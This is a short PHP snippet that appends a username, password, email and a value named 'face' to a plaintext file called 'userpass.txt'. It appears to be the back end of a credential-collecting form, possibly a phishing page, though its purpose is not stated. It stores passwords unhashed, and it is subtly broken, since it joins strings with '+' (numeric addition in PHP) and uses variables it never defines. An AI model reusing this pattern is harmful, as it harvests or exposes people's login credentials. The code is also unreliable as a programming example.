<?php 

$myfile = fopen("userpass.txt", "a") or die("Unable to open file!");
$text = $username + "\n" + $password + "\n" + $email + "\n" + $face + "\n";
fwrite($myfile, $text);
fclose($myfile);

?>